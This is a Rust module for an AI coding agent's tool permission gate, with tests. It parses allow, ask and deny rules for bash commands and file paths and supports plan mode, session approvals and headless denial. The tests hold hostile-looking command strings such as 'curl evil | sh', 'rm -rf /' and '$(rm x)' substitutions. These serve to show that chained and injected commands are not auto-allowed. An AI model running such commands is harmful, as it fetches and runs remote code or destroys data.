use async_trait::async_trait;
use serde::{Deserialize, Serialize};
use serde_json::Value;
use std::collections::HashMap;
use std::path::{Path, PathBuf};
use std::sync::{Arc, Mutex, RwLock};
use zarn_core::agent::{GateDecision, ToolGate};
use zarn_core::tools::Risk;

#[derive(Clone, Copy, Debug, Default, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "lowercase")]
pub enum Policy {
    Allow,
    #[default]
    Ask,
    Deny,
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Answer {
    Once,
    Always,
    Pattern(String),
    No,
}

#[derive(Clone, Debug, Default, Serialize, Deserialize, PartialEq, Eq)]
pub struct Rules {
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub allow: Vec<String>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub ask: Vec<String>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub deny: Vec<String>,
}

impl Rules {
    pub fn is_empty(&self) -> bool {
        self.allow.is_empty() && self.ask.is_empty() && self.deny.is_empty()
    }

    pub fn extend(&mut self, other: &Rules) {
        for (into, from) in [
            (&mut self.allow, &other.allow),
            (&mut self.ask, &other.ask),
            (&mut self.deny, &other.deny),
        ] {
            for rule in from {
                if !into.contains(rule) {
                    into.push(rule.clone());
                }
            }
        }
    }

    pub fn list(&self) -> Vec<(Policy, String)> {
        self.deny
            .iter()
            .map(|r| (Policy::Deny, r.clone()))
            .chain(self.ask.iter().map(|r| (Policy::Ask, r.clone())))
            .chain(self.allow.iter().map(|r| (Policy::Allow, r.clone())))
            .collect()
    }
}

pub const FILE_TOOLS: &[&str] = &["read", "edit", "write", "multiedit", "notebook_edit"];

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Rule {
    pub text: String,
    pub tool: String,
    pub spec: Option<String>,
}

pub fn parse_rule(text: &str) -> Result<Rule, String> {
    let text = text.trim();
    let (tool, spec) = match text.split_once('(') {
        None => (text, None),
        Some((tool, rest)) => {
            let Some(spec) = rest.strip_suffix(')') else {
                return Err(format!("rule '{text}' has no closing parenthesis"));
            };
            if spec.trim().is_empty() {
                return Err(format!("rule '{text}' has an empty pattern"));
            }
            (tool, Some(spec.trim().to_string()))
        }
    };
    let tool = tool.trim().to_lowercase();
    if tool.is_empty()
        || !tool
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-')
    {
        return Err(format!("rule '{text}' must start with a tool name"));
    }
    if let Some(spec) = &spec
        && FILE_TOOLS.contains(&tool.as_str())
    {
        globset::Glob::new(spec).map_err(|e| format!("rule '{text}': {e}"))?;
    }
    Ok(Rule {
        text: text.to_string(),
        tool,
        spec,
    })
}

fn segments(command: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut current = String::new();
    let mut chars = command.chars().peekable();
    while let Some(c) = chars.next() {
        let split = match c {
            ';' | '\n' => true,
            '|' | '&' => {
                if chars.peek() == Some(&c) {
                    chars.next();
                }
                true
            }
            _ => false,
        };
        if split {
            out.push(std::mem::take(&mut current));
        } else {
            current.push(c);
        }
    }
    out.push(current);
    out.into_iter()
        .map(|s| s.split_whitespace().collect::<Vec<_>>().join(" "))
        .filter(|s| !s.is_empty())
        .collect()
}

fn command_matches(spec: &str, command: &str) -> bool {
    let command = command.split_whitespace().collect::<Vec<_>>().join(" ");
    match spec.strip_suffix(":*") {
        Some(prefix) => {
            let prefix = prefix.trim();
            command == prefix || command.starts_with(&format!("{prefix} "))
        }
        None => command == spec.split_whitespace().collect::<Vec<_>>().join(" "),
    }
}

fn substitutes(command: &str) -> bool {
    command.contains("$(") || command.contains('`') || command.contains('>') || command.contains('<')
}

fn arg_path(args: &Value) -> Option<&str> {
    ["path", "notebook_path", "file_path"]
        .iter()
        .find_map(|k| args.get(*k).and_then(Value::as_str))
}

pub fn relative(path: &str, cwd: &Path) -> Option<String> {
    let p = Path::new(path);
    let full = if p.is_absolute() { p.to_path_buf() } else { cwd.join(p) };
    let mut parts: Vec<std::path::Component> = Vec::new();
    for part in full.components() {
        match part {
            std::path::Component::ParentDir => {
                parts.pop();
            }
            std::path::Component::CurDir => {}
            other => parts.push(other),
        }
    }
    let normal: PathBuf = parts.iter().collect();
    normal
        .strip_prefix(cwd)
        .ok()
        .map(|r| r.to_string_lossy().replace('\\', "/"))
}

impl Rule {
    fn names(&self, name: &str) -> bool {
        self.tool == name.to_lowercase()
    }

    pub fn matches(&self, name: &str, args: &Value, cwd: &Path, strict: bool) -> bool {
        if !self.names(name) {
            return false;
        }
        let Some(spec) = &self.spec else {
            return true;
        };
        if self.tool == "bash" {
            let Some(command) = args.get("command").and_then(Value::as_str) else {
                return false;
            };
            let parts = segments(command);
            if strict {
                return parts.len() == 1 && !substitutes(command) && command_matches(spec, &parts[0]);
            }
            return parts.iter().any(|part| command_matches(spec, part));
        }
        if FILE_TOOLS.contains(&self.tool.as_str()) {
            let Some(path) = arg_path(args) else {
                return false;
            };
            let Some(rel) = relative(path, cwd) else {
                return false;
            };
            return globset::GlobBuilder::new(spec)
                .literal_separator(true)
                .build()
                .map(|g| g.compile_matcher().is_match(&rel))
                .unwrap_or(false);
        }
        false
    }
}

pub fn suggest(name: &str, args: &Value, cwd: &Path) -> String {
    if name == "bash"
        && let Some(command) = args.get("command").and_then(Value::as_str)
    {
        let words: Vec<&str> = command.split_whitespace().collect();
        let takes_sub = ["git", "cargo", "npm", "pnpm", "yarn", "go", "docker", "kubectl", "make", "uv", "pip"];
        let prefix = match words.as_slice() {
            [first, second, ..] if takes_sub.contains(first) && !second.starts_with('-') => {
                format!("{first} {second}")
            }
            [first, ..] => first.to_string(),
            [] => return name.to_string(),
        };
        return format!("bash({prefix}:*)");
    }
    if FILE_TOOLS.contains(&name)
        && let Some(path) = arg_path(args)
        && let Some(rel) = relative(path, cwd)
    {
        return format!("{name}({rel})");
    }
    name.to_string()
}

#[async_trait]
pub trait PermissionPrompt: Send + Sync {
    async fn ask(&self, tool: &str, risk: Risk, args: &Value) -> Answer;
}

pub struct DenyAll;

#[async_trait]
impl PermissionPrompt for DenyAll {
    async fn ask(&self, _tool: &str, _risk: Risk, _args: &Value) -> Answer {
        Answer::No
    }
}

#[derive(Clone, Debug, Default, PartialEq, Eq)]
pub struct Overlay {
    pub name: String,
    pub policies: HashMap<String, Policy>,
    pub allow_all: bool,
    pub safe_only: bool,
}

impl Overlay {
    pub fn is_empty(&self) -> bool {
        self.policies.is_empty() && !self.allow_all && !self.safe_only
    }
}

pub const PLAN_DENIAL: &str = "plan mode allows only read-only tools until the plan is approved; call exit_plan with your plan";

pub struct Permissions {
    overlay: RwLock<Overlay>,
    rules: RwLock<Vec<(Policy, Rule)>>,
    session_rules: Mutex<Vec<Rule>>,
    turn_rules: Mutex<Vec<Rule>>,
    cwd: RwLock<PathBuf>,
    safe: RwLock<Option<Vec<String>>>,
    configured: RwLock<HashMap<String, Policy>>,
    by_risk: HashMap<Risk, Policy>,
    session: Mutex<HashMap<String, Policy>>,
    prompt: Arc<dyn PermissionPrompt>,
}

impl Permissions {
    pub fn new(prompt: Arc<dyn PermissionPrompt>) -> Self {
        let by_risk = HashMap::from([
            (Risk::Safe, Policy::Allow),
            (Risk::Write, Policy::Ask),
            (Risk::Execute, Policy::Ask),
        ]);
        Permissions {
            overlay: RwLock::new(Overlay::default()),
            rules: RwLock::new(Vec::new()),
            session_rules: Mutex::new(Vec::new()),
            turn_rules: Mutex::new(Vec::new()),
            cwd: RwLock::new(PathBuf::from(".")),
            safe: RwLock::new(Some(crate::safe_shell::defaults())),
            configured: RwLock::new(HashMap::new()),
            by_risk,
            session: Mutex::new(HashMap::new()),
            prompt,
        }
    }

    pub fn headless() -> Self {
        Self::new(Arc::new(DenyAll))
    }

    pub fn with_tool(self, name: impl Into<String>, policy: Policy) -> Self {
        if let Ok(mut configured) = self.configured.write() {
            configured.insert(name.into(), policy);
        }
        self
    }

    pub fn with_tools(self, policies: impl IntoIterator<Item = (String, Policy)>) -> Self {
        if let Ok(mut configured) = self.configured.write() {
            configured.extend(policies);
        }
        self
    }

    pub fn set_policies(&self, policies: impl IntoIterator<Item = (String, Policy)>) {
        if let Ok(mut configured) = self.configured.write() {
            *configured = policies.into_iter().collect();
        }
    }

    pub fn set_rules(&self, rules: &Rules) -> Vec<String> {
        let mut parsed = Vec::new();
        let mut errors = Vec::new();
        for (policy, text) in rules.list() {
            match parse_rule(&text) {
                Ok(rule) => parsed.push((policy, rule)),
                Err(err) => errors.push(err),
            }
        }
        if let Ok(mut current) = self.rules.write() {
            *current = parsed;
        }
        errors
    }

    pub fn with_rules(self, rules: &Rules) -> Self {
        self.set_rules(rules);
        self
    }

    pub fn set_cwd(&self, cwd: impl Into<PathBuf>) {
        if let Ok(mut current) = self.cwd.write() {
            *current = cwd.into();
        }
    }

    pub fn with_cwd(self, cwd: impl Into<PathBuf>) -> Self {
        self.set_cwd(cwd);
        self
    }

    pub fn set_safe_commands(&self, safe: Option<Vec<String>>) {
        if let Ok(mut current) = self.safe.write() {
            *current = safe;
        }
    }

    pub fn allow_pattern_for_session(&self, pattern: &str) -> Result<(), String> {
        let rule = parse_rule(pattern)?;
        if let Ok(mut session) = self.session_rules.lock()
            && !session.contains(&rule)
        {
            session.push(rule);
        }
        Ok(())
    }

    pub fn session_patterns(&self) -> Vec<String> {
        self.session_rules
            .lock()
            .map(|r| r.iter().map(|r| r.text.clone()).collect())
            .unwrap_or_default()
    }

    fn cwd(&self) -> PathBuf {
        self.cwd.read().map(|c| c.clone()).unwrap_or_default()
    }

    fn rule_hit(&self, policy: Policy, name: &str, args: &Value) -> Option<String> {
        let cwd = self.cwd();
        let strict = policy == Policy::Allow;
        self.rules.read().ok()?.iter().find_map(|(p, rule)| {
            (*p == policy && rule.matches(name, args, &cwd, strict)).then(|| rule.text.clone())
        })
    }

    pub fn set_turn_rules(&self, rules: Vec<Rule>) {
        if let Ok(mut current) = self.turn_rules.lock() {
            *current = rules;
        }
    }

    pub fn clear_turn_rules(&self) {
        self.set_turn_rules(Vec::new());
    }

    fn turn_hit(&self, name: &str, args: &Value) -> bool {
        let cwd = self.cwd();
        self.turn_rules
            .lock()
            .is_ok_and(|rules| rules.iter().any(|r| r.matches(name, args, &cwd, true)))
    }

    fn session_hit(&self, name: &str, args: &Value) -> bool {
        let cwd = self.cwd();
        self.session_rules
            .lock()
            .is_ok_and(|rules| rules.iter().any(|r| r.matches(name, args, &cwd, true)))
    }

    pub fn safe_command(&self, name: &str, args: &Value) -> bool {
        if name != "bash" {
            return false;
        }
        let Some(command) = args.get("command").and_then(Value::as_str) else {
            return false;
        };
        self.safe
            .read()
            .ok()
            .and_then(|s| s.clone())
            .is_some_and(|list| crate::safe_shell::is_safe(command, &list))
    }

    pub fn decide(&self, name: &str, risk: Risk, args: &Value) -> (Policy, String) {
        let configured = self
            .configured
            .read()
            .ok()
            .and_then(|c| c.get(name).copied());
        if self.plan_blocks(name, risk) {
            return (Policy::Deny, "plan mode".into());
        }
        if configured == Some(Policy::Deny) {
            return (Policy::Deny, format!("{name} = deny"));
        }
        if let Some(rule) = self.rule_hit(Policy::Deny, name, args) {
            return (Policy::Deny, format!("deny rule {rule}"));
        }
        let overlay = self.overlay();
        if overlay.policies.get(name) == Some(&Policy::Deny) {
            return (Policy::Deny, format!("{} mode", overlay.name));
        }
        if let Some(rule) = self.rule_hit(Policy::Ask, name, args)
            && !overlay.allow_all
        {
            return (Policy::Ask, format!("ask rule {rule}"));
        }
        if let Some(rule) = self.rule_hit(Policy::Allow, name, args) {
            return (Policy::Allow, format!("allow rule {rule}"));
        }
        if self.session_hit(name, args) {
            return (Policy::Allow, "allowed for this session".into());
        }
        if self.turn_hit(name, args) {
            return (Policy::Allow, "allowed by the command's allowed-tools".into());
        }
        match overlay.policies.get(name) {
            Some(policy) => return (*policy, format!("{} mode", overlay.name)),
            None if overlay.allow_all => return (Policy::Allow, format!("{} mode", overlay.name)),
            None => {}
        }
        if let Ok(session) = self.session.lock()
            && let Some(policy) = session.get(name)
        {
            return (*policy, "allowed for this session".into());
        }
        let (policy, why) = match configured {
            Some(policy) => (policy, format!("{name} = {}", policy_word(policy))),
            None => (
                self.by_risk.get(&risk).copied().unwrap_or(Policy::Ask),
                "default for its risk".to_string(),
            ),
        };
        if policy == Policy::Ask && self.safe_command(name, args) {
            return (Policy::Allow, "read-only command".into());
        }
        (policy, why)
    }

    pub fn set_overlay(&self, overlay: Overlay) {
        if let Ok(mut current) = self.overlay.write() {
            *current = overlay;
        }
    }

    pub fn overlay(&self) -> Overlay {
        self.overlay.read().map(|o| o.clone()).unwrap_or_default()
    }

    pub fn with_overlay(self, overlay: Overlay) -> Self {
        self.set_overlay(overlay);
        self
    }

    pub fn with_risk(mut self, risk: Risk, policy: Policy) -> Self {
        self.by_risk.insert(risk, policy);
        self
    }

    pub fn allow_for_session(&self, name: &str) {
        if let Ok(mut session) = self.session.lock() {
            session.insert(name.to_string(), Policy::Allow);
        }
    }

    fn plan_blocks(&self, name: &str, risk: Risk) -> bool {
        self.overlay.read().is_ok_and(|o| o.safe_only) && risk != Risk::Safe && name != "exit_plan"
    }

    pub fn policy_for(&self, name: &str, risk: Risk) -> Policy {
        self.decide(name, risk, &Value::Null).0
    }
}

pub fn policy_word(policy: Policy) -> &'static str {
    match policy {
        Policy::Allow => "allow",
        Policy::Ask => "ask",
        Policy::Deny => "deny",
    }
}

#[async_trait]
impl ToolGate for Permissions {
    async fn check(&self, name: &str, risk: Risk, args: &Value) -> GateDecision {
        let (policy, why) = self.decide(name, risk, args);
        match policy {
            Policy::Allow => GateDecision::Allow,
            Policy::Deny if self.plan_blocks(name, risk) => GateDecision::Deny(PLAN_DENIAL.into()),
            Policy::Deny if why.starts_with("deny rule ") => GateDecision::Deny(format!(
                "this {name} call is denied by the {}",
                why
            )),
            Policy::Deny if why.ends_with(" mode") => {
                GateDecision::Deny(format!("tool {name} is denied in {why}"))
            }
            Policy::Deny => {
                GateDecision::Deny(format!("tool {name} is denied by the permission policy"))
            }
            Policy::Ask => match self.prompt.ask(name, risk, args).await {
                Answer::Once => GateDecision::Allow,
                Answer::Always => {
                    self.allow_for_session(name);
                    GateDecision::Allow
                }
                Answer::Pattern(pattern) => {
                    if self.allow_pattern_for_session(&pattern).is_err() {
                        self.allow_for_session(name);
                    }
                    GateDecision::Allow
                }
                Answer::No => GateDecision::Deny(format!("user denied {name}")),
            },
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    struct AlwaysYes;

    #[async_trait]
    impl PermissionPrompt for AlwaysYes {
        async fn ask(&self, _tool: &str, _risk: Risk, _args: &Value) -> Answer {
            Answer::Always
        }
    }

    #[test]
    fn risk_defaults_apply_when_nothing_is_configured() {
        let perms = Permissions::headless();
        assert_eq!(perms.policy_for("read", Risk::Safe), Policy::Allow);
        assert_eq!(perms.policy_for("bash", Risk::Execute), Policy::Ask);
    }

    #[test]
    fn policies_can_be_replaced_while_running() {
        let perms = Permissions::headless().with_tool("bash", Policy::Deny);
        perms.set_policies([("bash".to_string(), Policy::Allow)]);
        assert_eq!(perms.policy_for("bash", Risk::Execute), Policy::Allow);
    }

    #[tokio::test]
    async fn a_later_deny_beats_an_earlier_always() {
        let perms = Permissions::new(Arc::new(AlwaysYes));
        perms.check("bash", Risk::Execute, &Value::Null).await;
        perms.set_policies([("bash".to_string(), Policy::Deny)]);
        assert_eq!(perms.policy_for("bash", Risk::Execute), Policy::Deny);
    }

    fn overlay(name: &str, policies: &[(&str, Policy)]) -> Overlay {
        Overlay {
            name: name.into(),
            policies: policies.iter().map(|(t, p)| (t.to_string(), *p)).collect(),
            ..Overlay::default()
        }
    }

    #[test]
    fn an_overlay_sits_on_top_of_config_and_comes_off_cleanly() {
        let perms = Permissions::headless().with_tool("edit", Policy::Allow);
        perms.set_overlay(overlay("review", &[("edit", Policy::Deny), ("bash", Policy::Ask)]));
        assert_eq!(perms.policy_for("edit", Risk::Write), Policy::Deny);
        perms.set_overlay(Overlay::default());
        assert_eq!(perms.policy_for("edit", Risk::Write), Policy::Allow);
    }

    #[test]
    fn an_overlay_cannot_lift_a_configured_deny() {
        let perms = Permissions::headless().with_tool("bash", Policy::Deny);
        perms.set_overlay(Overlay {
            allow_all: true,
            ..overlay("bypass", &[("bash", Policy::Allow)])
        });
        assert_eq!(perms.policy_for("bash", Risk::Execute), Policy::Deny);
    }

    #[tokio::test]
    async fn plan_mode_denies_anything_that_is_not_read_only() {
        let perms = Permissions::new(Arc::new(AlwaysYes));
        perms.set_overlay(Overlay {
            safe_only: true,
            ..overlay("plan", &[])
        });
        let denied = perms.check("write", Risk::Write, &Value::Null).await;
        assert_eq!(denied, GateDecision::Deny(PLAN_DENIAL.into()));
        assert_eq!(perms.check("read", Risk::Safe, &Value::Null).await, GateDecision::Allow);
        assert_eq!(perms.check("exit_plan", Risk::Safe, &Value::Null).await, GateDecision::Allow);
    }

    fn rules(allow: &[&str], ask: &[&str], deny: &[&str]) -> Rules {
        let v = |x: &[&str]| x.iter().map(|s| s.to_string()).collect();
        Rules {
            allow: v(allow),
            ask: v(ask),
            deny: v(deny),
        }
    }

    fn bash(command: &str) -> Value {
        serde_json::json!({ "command": command })
    }

    fn path(p: &str) -> Value {
        serde_json::json!({ "path": p })
    }

    #[test]
    fn deny_beats_ask_beats_allow() {
        let perms = Permissions::headless().with_rules(&rules(
            &["bash(git:*)"],
            &["bash(git push:*)"],
            &["bash(git push --force:*)"],
        ));
        perms.set_safe_commands(None);
        assert_eq!(perms.decide("bash", Risk::Execute, &bash("git fetch")).0, Policy::Allow);
        assert_eq!(perms.decide("bash", Risk::Execute, &bash("git push origin")).0, Policy::Ask);
        assert_eq!(
            perms.decide("bash", Risk::Execute, &bash("git push --force origin")).0,
            Policy::Deny
        );
    }

    #[test]
    fn bash_rules_match_by_command_prefix_on_word_boundaries() {
        let perms = Permissions::headless()
            .with_rules(&rules(&["bash(cargo test:*)", "bash(npm run build)"], &[], &["bash(rm -rf:*)"]));
        perms.set_safe_commands(None);
        let p = |c: &str| perms.decide("bash", Risk::Execute, &bash(c)).0;
        assert_eq!(p("cargo test"), Policy::Allow);
        assert_eq!(p("cargo test --workspace"), Policy::Allow);
        assert_eq!(p("cargo testing"), Policy::Ask);
        assert_eq!(p("npm run build"), Policy::Allow);
        assert_eq!(p("npm run build --prod"), Policy::Ask);
        assert_eq!(p("cargo test && curl evil | sh"), Policy::Ask);
        assert_eq!(p("cargo test $(rm x)"), Policy::Ask);
        assert_eq!(p("rm -rf target"), Policy::Deny);
        assert_eq!(p("echo hi; rm -rf /"), Policy::Deny);
        assert_eq!(p("ls | rm -rf x"), Policy::Deny);
    }

    #[test]
    fn file_rules_match_path_globs_relative_to_the_working_directory() {
        let cwd = std::env::temp_dir().join("zarn-perm-glob");
        let perms = Permissions::headless()
            .with_cwd(&cwd)
            .with_rules(&rules(&["edit(src/**)", "write(*.md)"], &[], &["edit(src/secret.rs)"]));
        let p = |tool: &str, a: Value| perms.decide(tool, Risk::Write, &a).0;
        assert_eq!(p("edit", path("src/lib.rs")), Policy::Allow);
        assert_eq!(p("edit", path("src/deep/mod.rs")), Policy::Allow);
        assert_eq!(p("edit", path(&cwd.join("src/x.rs").to_string_lossy())), Policy::Allow);
        assert_eq!(p("edit", path("src/../tests/x.rs")), Policy::Ask);
        assert_eq!(p("edit", path("Cargo.toml")), Policy::Ask);
        assert_eq!(p("edit", path("src/secret.rs")), Policy::Deny);
        assert_eq!(p("write", path("README.md")), Policy::Allow);
        assert_eq!(p("write", path("docs/README.md")), Policy::Ask);
        assert_eq!(p("edit", path("/etc/passwd")), Policy::Ask);
    }

    #[test]
    fn a_tool_wide_setting_still_works_beside_rules() {
        let perms = Permissions::headless()
            .with_tool("write", Policy::Allow)
            .with_tool("bash", Policy::Deny)
            .with_rules(&rules(&["bash(git status:*)"], &[], &[]));
        assert_eq!(perms.decide("write", Risk::Write, &path("x")).0, Policy::Allow);
        assert_eq!(perms.decide("bash", Risk::Execute, &bash("git status")).0, Policy::Deny);
    }

    #[test]
    fn read_only_commands_skip_the_prompt_unless_turned_off_or_denied() {
        let perms = Permissions::headless();
        assert_eq!(perms.decide("bash", Risk::Execute, &bash("git status")).0, Policy::Allow);
        assert_eq!(perms.decide("bash", Risk::Execute, &bash("git status; rm x")).0, Policy::Ask);
        perms.set_safe_commands(None);
        assert_eq!(perms.decide("bash", Risk::Execute, &bash("git status")).0, Policy::Ask);
        let denied = Permissions::headless().with_tool("bash", Policy::Deny);
        assert_eq!(denied.decide("bash", Risk::Execute, &bash("ls")).0, Policy::Deny);
    }

    #[test]
    fn bad_rules_are_reported() {
        let perms = Permissions::headless();
        let errors = perms.set_rules(&rules(&["bash(git", "(x)"], &[], &["edit([)"]));
        assert_eq!(errors.len(), 3);
    }

    #[test]
    fn suggestions_are_specific_to_the_call() {
        let cwd = Path::new("/work");
        assert_eq!(suggest("bash", &bash("git diff --stat"), cwd), "bash(git diff:*)");
        assert_eq!(suggest("bash", &bash("ls -la"), cwd), "bash(ls:*)");
        assert_eq!(suggest("edit", &path("/work/src/a.rs"), cwd), "edit(src/a.rs)");
        assert_eq!(suggest("mcp__x", &Value::Null, cwd), "mcp__x");
    }

    #[tokio::test]
    async fn a_pattern_answer_allows_matching_calls_for_the_session_only() {
        struct Pattern;
        #[async_trait]
        impl PermissionPrompt for Pattern {
            async fn ask(&self, _tool: &str, _risk: Risk, _args: &Value) -> Answer {
                Answer::Pattern("bash(cargo build:*)".into())
            }
        }
        let perms = Permissions::new(Arc::new(Pattern));
        perms.set_safe_commands(None);
        perms.check("bash", Risk::Execute, &bash("cargo build")).await;
        assert_eq!(perms.decide("bash", Risk::Execute, &bash("cargo build --release")).0, Policy::Allow);
        assert_eq!(perms.decide("bash", Risk::Execute, &bash("cargo publish")).0, Policy::Ask);
    }

    #[test]
    fn configured_policy_beats_risk_default() {
        let perms = Permissions::headless().with_tool("bash", Policy::Deny);
        assert_eq!(perms.policy_for("bash", Risk::Execute), Policy::Deny);
    }

    #[tokio::test]
    async fn headless_denies_anything_that_would_prompt() {
        let perms = Permissions::headless();
        let decision = perms.check("write", Risk::Write, &Value::Null).await;
        assert!(matches!(decision, GateDecision::Deny(_)));
    }

    #[tokio::test]
    async fn always_is_remembered_for_the_session() {
        let perms = Permissions::new(Arc::new(AlwaysYes));
        assert_eq!(perms.policy_for("write", Risk::Write), Policy::Ask);
        assert_eq!(
            perms.check("write", Risk::Write, &Value::Null).await,
            GateDecision::Allow
        );
        assert_eq!(perms.policy_for("write", Risk::Write), Policy::Allow);
    }

    #[tokio::test]
    async fn session_override_does_not_resurrect_a_denied_tool() {
        let perms = Permissions::new(Arc::new(AlwaysYes)).with_tool("bash", Policy::Deny);
        let decision = perms.check("bash", Risk::Execute, &Value::Null).await;
        assert!(matches!(decision, GateDecision::Deny(_)));
    }
}
